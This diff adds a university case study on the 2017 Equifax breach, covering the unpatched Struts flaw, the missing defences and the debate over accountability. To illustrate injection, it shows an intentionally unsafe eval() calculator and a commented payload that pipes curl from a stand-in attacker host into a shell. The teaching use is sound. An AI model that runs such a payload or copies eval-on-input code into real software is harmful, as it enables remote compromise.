@@ -1,0 +1,147 @@
+---
+title: "The Equifax Breach"
+subtitle: "How 147 million people were harmed by a company none of them chose — a COMP 1150 case study"
+author: "Brendan Shea, PhD"
+date: last-modified
+bibliography: refs.bib
+---
+
+::: {.case-at-a-glance}
+- **Who:** Equifax, one of three companies that quietly hold financial dossiers on nearly every adult in America; Richard Smith, its CEO; the security staff who circulated a patch warning that never reached the right servers; and 147 million people who never agreed to any of it.
+- **What:** In 2017, attackers walked through a single unpatched hole in a public website and, over eleven unwatched weeks, copied the Social Security numbers, birth dates, and addresses of nearly half the U.S. population. Almost every safeguard that should have stopped them was missing, expired, or misconfigured.
+- **Where / When:** Equifax's consumer-dispute portal, breached mid-May 2017; discovered July 29; disclosed September 7. Attributed by the U.S. Department of Justice, in 2020, to four members of the Chinese military.
+- **Why it matters:** The victims were not Equifax's customers. They were its product — data collected without consent, held without permission, and impossible to take back. This case is about the collision between [breach inevitability]{.key-term} — the grim truth that any defender can be beaten — and [accountability]{.key-term}, the question of who answers when the people harmed never had a choice.
+- **Concepts at play:** known vulnerabilities and patching, remote code execution as [untrusted input becoming code]{.key-term}, certificates and monitoring, credential storage, [defense in depth]{.key-term}, data as a liability
+:::
+
+## The Case
+
+On March 7, 2017, the Apache Software Foundation published an urgent fix. A flaw in Struts — free software that thousands of companies use to build websites — let an attacker send a specially crafted web request and make the server *run commands*. Not read data. Run commands. The flaw got a name, CVE-2017-5638, and a severity score near the maximum. The message to everyone using Struts was blunt: patch now.
+
+Equifax used Struts. Its own security team saw the alert and did the right thing — it sent a company-wide email telling the responsible teams to apply the patch. But the email went to a distribution list that did not include the people running a system called ACIS, the online portal where consumers dispute errors on their credit reports. A follow-up scan, meant to catch any server that had missed the patch, was pointed at the wrong directory and found nothing. And so, on one public-facing website, the hole stayed open.
+
+::: {.context-box}
+**A known vulnerability, and the patch gap.** A [vulnerability]{.key-term} is a weakness an attacker can exploit. When researchers find one in widely used software, it is published with an ID (a "CVE") and, usually, a patch. That publication is a double-edged sword: defenders learn to fix it, but attackers learn exactly what to look for. The dangerous window is the gap between "patch available" and "patch applied" — and applying patches across thousands of servers is unglamorous, endless work that is easy to get slightly wrong. Equifax's gap was about two months. Attackers need only one.
+:::
+
+In the middle of May, they came through it. Once inside that single web server, the attackers found they could go almost anywhere. The network was not divided into sealed compartments, so one foothold opened onto dozens of systems. They discovered files containing usernames and passwords stored in plain, readable text — the keys to 51 different databases, left lying in the open. And then they began, patiently, to take what those databases held.
+
+For seventy-six days, nobody noticed.
+
+They should have. Equifax ran a device designed to inspect traffic leaving the network and flag anything suspicious — exactly the kind of monitoring that catches a slow leak. But to inspect encrypted traffic, that device needed a valid security certificate, and its certificate had expired *nineteen months earlier*. For over a year and a half, the guard at the exit had been standing with its eyes closed. The attackers pulled data out in small, unremarkable chunks, week after week, and the alarm that should have screamed stayed silent.
+
+::: {.context-box}
+**Defense in depth, and why the first mistake isn't the whole story.** No serious security rests on a single wall. [Defense in depth]{.key-term} means stacking independent safeguards, so that when one fails — and one always eventually fails — another is waiting: divide the network so a single breach can't reach everything; store credentials as unreadable hashes, never plain text; watch the exits for data leaving. Equifax's break-in was one failure. Its *catastrophe* was that behind that failure stood no second layer, no third, no fourth. The depth of the collapse, not the first open door, is what turned a break-in into a national event.
+:::
+
+On July 29, a technician finally renewed the expired certificate. The monitoring device blinked awake — and instantly lit up with eleven weeks of theft, already complete. The data of 147 million people was gone: names, Social Security numbers, birth dates, addresses, some driver's license numbers, and the credit card numbers of hundreds of thousands.
+
+What followed made the wound worse. In the weeks between the internal discovery and the public announcement, three Equifax executives sold company stock; one, Jun Ying, was later convicted of insider trading. When Equifax finally told the public on September 7, it directed worried people to a hastily built website — one that looked so much like a scam that security tools flagged it, and Equifax's own official Twitter account, confused, sent users to a lookalike site a researcher had set up to prove the point. The company offered free credit monitoring, provided by Equifax itself, initially wrapped in fine print requiring customers to give up their right to sue.
+
+CEO Richard Smith retired and was called before Congress. In 2019, Equifax agreed to a settlement worth up to roughly $700 million. In 2020, the Justice Department indicted four members of the Chinese People's Liberation Army for the intrusion.
+
+And then the story simply... ended. The stock recovered. The company grew. The people whose most sensitive numbers now circulate forever received, most of them, a few dollars or an offer of monitoring. The interesting question was never *how* the breach happened — the autopsy is thorough and damning. It is *who was supposed to pay for it, and why almost no one did.*
+
+## How It Worked
+
+The break-in and the catastrophe are two different technical stories. The first is about a single class of bug. The second is about everything that wasn't there to catch it.
+
+### The break-in: when input becomes a command
+
+The Struts flaw belongs to the most important family of vulnerabilities in this whole subject: input that the program treats as *code* instead of *data*. The attacker sends what looks like an ordinary piece of a web request, but the server, instead of just reading it, *executes* it.
+
+You can see the shape of the bug in a tiny, deliberately foolish "calculator" that runs whatever a user types:
+
+```python
+def calculate(expression):
+    return eval(expression)   # runs the input as a Python command
+
+print(calculate("2 + 2"))       # 4
+print(calculate("100 * 12"))    # 1200
+```
+
+For a user typing `2 + 2`, this works perfectly — which is exactly why such bugs survive. But `eval` doesn't *check* anything; it runs whatever arrives. Hand it something that isn't arithmetic at all —
+
+```python
+# An attacker doesn't send "2 + 2". They send code:
+#   __import__('os').system('curl evil.example/steal | sh')
+# and the server, treating input as a command, runs it.
+```
+
+— and the calculator becomes a way to run the attacker's commands on your machine. That is [remote code execution]{.key-term}, the most dangerous outcome in security, and it is the same root confusion behind every injection attack: **the program let untrusted input cross the line from data into code.** Struts made that mistake while parsing a header almost nobody thinks about. The fix, then and always, is to treat input as inert data and never let it reach a place where it can execute.
+
+### The catastrophe: the layers that weren't there
+
+One open door lets an attacker in. It should not let them reach everything, stay for months, and leave with half a country's identities. That it did is a story of missing layers — each one a safeguard that, had it existed, would have shrunk the disaster. Walk the attack past the defenses that should have met it:
+
+| Stage of the attack | What should have stopped it | What Equifax had |
+|---|---|---|
+| Crafted request hits the portal | the patch, applied within days | a two-month gap; the alert never reached the team |
+| Attacker spreads from one server | network segmentation, sealing compartments | a flat network; one foothold reached dozens of systems |
+| Attacker reads database logins | credentials stored as unreadable hashes | usernames and passwords in plain text |
+| Data streams out for 76 days | monitoring that watches the exits | a monitor blinded by a certificate expired 19 months |
+
+Read the table top to bottom and a pattern appears: not one failure, but four, stacked — and each was a lesson known to the field for decades. The attacker needed a single hole. Equifax needed all four defenses working, on every system, continuously, for years. That asymmetry is real, and it is the strongest thing that can be said in the company's defense. It is also where the argument begins.
+
+## The Argument the Breach Started
+
+The positions connect: each answers the one before.
+
+### The negligence argument: this was preventable
+
+To the congressional investigators who spent a year reconstructing the breach, the conclusion was not close. A patch existed for two months. The scan that should have caught the miss was misconfigured. Credentials sat in plain text. The monitoring certificate had been dead for over a year. Any one of these, fixed, might have stopped or shrunk the theft.
+
+::: {.argument}
+**The Negligence Argument**
+
+1. Equifax held some of the most sensitive data in the country, which imposes a correspondingly high duty of care.
+2. The failures were not exotic — an unapplied patch, a flat network, plaintext passwords, dead monitoring — and each was a well-known, basic safeguard.
+3. Multiple independent safeguards were absent at once, so this was not one unlucky slip but a systemic collapse of ordinary care.
+4. Therefore the breach was preventable negligence, and Equifax is responsible for the harm it caused.
+:::
+
+The evidence is the autopsy itself [@houseoversight2018]. The weight rests on premise 2 — that these were *basic* measures a competent custodian would have had. That is the premise the reply contests, by arguing that "basic" is a fantasy of hindsight.
+
+### The inevitability reply: any defender can be beaten
+
+Security professionals — including many with no love for Equifax — push back on the comfort of the word *preventable*. Defense, they point out, is brutally asymmetric. And the attacker here was not a bored teenager; it was, according to the Justice Department, a unit of a nation's military [@doj2020equifax].
+
+::: {.argument}
+**The Inevitability Reply**
+
+1. An attacker needs to find one weakness; a defender must cover every weakness, on every system, at every moment, forever.
+2. In any large organization, there is *always* some unpatched server, some misconfiguration, some expired certificate — perfect security is not an achievable state.
+3. This attacker was a well-resourced nation-state, against which even elite defenders have fallen.
+4. Therefore "could a mistake be found?" is the wrong test — a mistake can always be found afterward — and calling the breach simple negligence mistakes the ordinary condition of computing for a special failure.
+:::
+
+There is real steel here, and every honest engineer feels it. Breaches are not rare accidents; they are a constant background weather, and hindsight makes every one look avoidable. But notice what the reply proves and what it doesn't. It shows that *perfect* security is impossible — which is true, and which no one disputes. It says nothing about whether Equifax exercised *reasonable* care, and nothing at all about the question the next move raises: whoever is to blame for the hole, why did the cost land where it did?
+
+**The accountability objection.** Grant the reply entirely. Say breaches are inevitable. The scandal then is not the hole; it is the *incentive structure* around it. When a store leaks its customers' data, those customers can leave, and the fear of that loss pressures the store to invest in security. Equifax faced no such pressure, because **the people it harmed were never its customers.** You do not choose Equifax. You cannot quit Equifax. It gathers its dossier on you whether you consent or not, and sells it to others. So the market signal that is supposed to punish bad security — customers walking away — cannot reach it, because the victims were never doing business there to begin with. The security writer Bruce Schneier names the deeper problem: data is not an asset but a *toxic asset*, a liability that, when it leaks, poisons other people — much like industrial pollution [@schneier2016]. And pollution is not controlled by hoping factories care. It is controlled by making them liable for the damage downstream. This objection reframes the whole dispute: the negligence argument and the inevitability reply are fighting over blame for the door, while the people who actually paid stand outside the argument entirely, having never been asked.
+
+### Where it rests today: a cost of doing business
+
+The years since sharpened the objection rather than answering it. Data-breach notification laws spread across the states, so companies must now *tell* you when they lose your data — a real gain in transparency that changes the incentives less than it seems. Settlements grew larger, but for a company Equifax's size, even $700 million reads as a cost of doing business, a bad quarter rather than an existential threat. The tidy lesson — collect less data, since you cannot lose what you never held — is widely praised and almost universally ignored, as every company races to gather more. Equifax itself is now larger than it was in 2017.
+
+Which leaves the question the case cannot escape. If losing the defining personal data of 147 million people — people who never signed up, never consented, and can never get that data back — costs a company less than a single good quarter, then what, exactly, is the deterrent? And if the answer is *almost none*, then the choice is stark: either we accept that the custodians of our most sensitive information have little reason to protect it, or we decide, as we once decided about factories and rivers, that some harms are too widely shared to be left to the goodwill of those who profit from causing them. Whose job is it to make that choice — and why has no one made it?
+
+## Discussion Questions
+
+1. The break-in worked because the server treated untrusted input as commands to run, instead of as data to read. Explain that idea in your own words. Then give an everyday example — outside computing — where mixing up "instructions" and "information" could go badly wrong.
+2. State the Negligence Argument and the Inevitability Reply in your own words. Are they disagreeing about the *facts* of what happened, or about the *standard* a company should be held to? Defend your reading.
+3. You are the security lead the week the Struts patch is released. You have a hundred urgent tasks and a patch that probably doesn't affect any critical system. Walk through how you decide what to do — and name the pressures that could lead you into Equifax's mistake.
+4. Pick an industry that handles something hazardous: a bank with money, a chemical plant, an airline. Should a company that holds your personal data be regulated more like that industry? Argue for a position.
+5. You cannot opt out of Equifax, and you were never its customer. Does a company owe a *different* duty to people who chose it than to people who never did? If so, what should that duty be?
+
+## Further Reading
+
+- The U.S. House Oversight Committee's investigation — the detailed autopsy of the patch, the certificate, and the credentials [@houseoversight2018].
+- The Government Accountability Office's report on the breach and the federal response [@nist2017equifax].
+- The Department of Justice indictment attributing the intrusion to four members of the Chinese military [@doj2020equifax].
+- Bruce Schneier, "Data Is a Toxic Asset" — the argument that held data is a liability to be minimized, not an asset to be hoarded [@schneier2016].
+- The Federal Trade Commission's summary of the settlement and what affected people were owed [@ftc2019equifax].
+
+## References
+
+::: {#refs}
+:::
